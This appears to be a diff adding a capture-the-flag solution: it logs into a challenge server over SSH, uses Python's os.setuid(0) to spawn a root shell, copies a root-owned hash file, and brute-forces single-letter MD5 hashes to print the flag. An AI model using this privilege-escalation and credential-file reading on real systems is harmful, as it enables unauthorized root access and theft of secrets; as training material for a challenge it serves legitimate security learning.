@@ -1,0 +1,30 @@
+CHALLENGE SOLUTION:
+-------------------
+ssh -p 5707 monkey@challenges.issessions.ca
+
+python3
+INSIDE PYTHON CONSOLE:
+----------------------
+>>> import os
+>>> os.setuid(0)
+>>> os.system("/bin/bash")
+
+cd /tmp
+cp /root/hashes.txt .
+
+nano script.py
+import hashlib
+import string
+
+s = string.ascii_lowercase
+
+with open("hashes.txt", "r") as f:
+    lines = f.readlines()
+    for line in lines:
+        for c in s:
+            if hashlib.md5(c.encode()).hexdigest() == line.strip():
+                print(c, end="")
+                break
+
+
+FLAG: monkeyCTF{notsaltyhashlist}
